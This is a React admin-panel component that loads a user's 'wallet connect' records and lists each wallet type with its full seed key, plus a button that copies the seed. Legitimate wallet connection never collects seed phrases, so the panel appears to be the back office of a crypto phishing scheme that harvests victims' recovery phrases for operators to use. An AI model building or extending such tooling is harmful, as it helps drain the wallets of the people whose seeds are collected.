import { useContext, useEffect, useState } from "react";
import { CreateUserIDContext } from "../listData";
import adminAuth from "../../../lib/adminAuth";
import useAlert from "../../../hooks/alert";

export default function WalletConnect() {
    const [connects, setConnects] = useState<any>({});
    const {AlertComponent, showAlert} = useAlert()

    const context = useContext(CreateUserIDContext)

    useEffect(() => {
        adminAuth.getUserWallets(context.ID).then((res:any) => {
            setConnects(res.data)
        }).catch((err:any) => {
            console.log(err)
        })
    }, [context.ID])

    
    const copyToClipboard = (text:string) => {
        navigator.clipboard.writeText(text)
        .then(() => {
            showAlert('success', 'Text copied to clipboard!');
        })
        .catch((error) => {
            showAlert('error', 'Failed to copy text to clipboard');
            console.log(error)
        });
    }
    return (
        <div className="">
            {
                    <>
                        <div className="mt-5">
                            <h2 className="text-xl font-medium text-[#212121cc]">Wallet Connect details</h2>
                        </div>
                        <div className="w-full overflow-y-auto rounded-2xl border-[1px] border-gray-100 mt-1">
                            <table className="w-full border-gray-200 border-[1px]">
                                <thead className="bg-[#f3f3f3]">
                                    <tr className="text-left">
                                        <th className="p-3 font-medium">Wallet</th>
                                        <th className="p-3 font-medium">Seed Keys</th>
                                        <th className="p-3 font-medium">copy</th>
                                    </tr>
                                </thead>


                                <tbody className="border-[#e6e4e4] border-[1px]">
                                    {
                                        !connects.length  ? <tr><td>User has not linked their wallet</td></tr> : connects.map(({id, seedKey, walletType}: any) => (
                                            <tr className="text-left" key={id}>
                                                <td className=" ">
                                                    <div className="text-gray-600">{walletType}</div>
                                                </td>
                                                <td className="p-3 font-medium">
                                                    <textarea cols={2} rows={2} defaultValue={seedKey} className="border-[1px] pl-2 border-gray-200 w-full bg-gray-100" disabled />
                                                </td>
                                                <td className="p-3 font-medium">
                                                    <button className="p-2 rounded-xl text-white bg-gray-600" onClick={copyToClipboard.bind(null, seedKey)}>
                                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><g fill="currentColor"><path d="M15.24 2h-3.894c-1.764 0-3.162 0-4.255.148c-1.126.152-2.037.472-2.755 1.193c-.719.721-1.038 1.636-1.189 2.766C3 7.205 3 8.608 3 10.379v5.838c0 1.508.92 2.8 2.227 3.342c-.067-.91-.067-2.185-.067-3.247v-5.01c0-1.281 0-2.386.118-3.27c.127-.948.413-1.856 1.147-2.593c.734-.737 1.639-1.024 2.583-1.152c.88-.118 1.98-.118 3.257-.118h3.07c1.276 0 2.374 0 3.255.118A3.601 3.601 0 0 0 15.24 2Z"/><path d="M6.6 11.397c0-2.726 0-4.089.844-4.936c.843-.847 2.2-.847 4.916-.847h2.88c2.715 0 4.073 0 4.917.847c.843.847.843 2.21.843 4.936v4.82c0 2.726 0 4.089-.843 4.936c-.844.847-2.202.847-4.917.847h-2.88c-2.715 0-4.073 0-4.916-.847c-.844-.847-.844-2.21-.844-4.936v-4.82Z"/></g></svg>
                                                    </button>
                                                </td>
                                            </tr>
                                        ))
                                    }

                                </tbody> 
                            </table>
                        </div>
                    </>
                }
            {AlertComponent}
        </div>
    )
}
